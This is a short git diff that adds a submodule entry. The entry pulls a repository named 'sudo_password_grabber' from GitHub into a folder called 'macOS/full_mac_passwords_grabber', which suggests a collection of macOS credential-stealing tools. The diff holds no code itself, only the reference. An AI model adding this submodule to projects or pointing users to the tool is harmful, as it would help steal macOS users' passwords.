@@ -1,0 +1,3 @@
+[submodule "macOS/full_mac_passwords_grabber/sudo_password_grabber"]
+	path = macOS/full_mac_passwords_grabber/sudo_password_grabber
+	url = https://github.com/birkhoffcheng/sudo_password_grabber
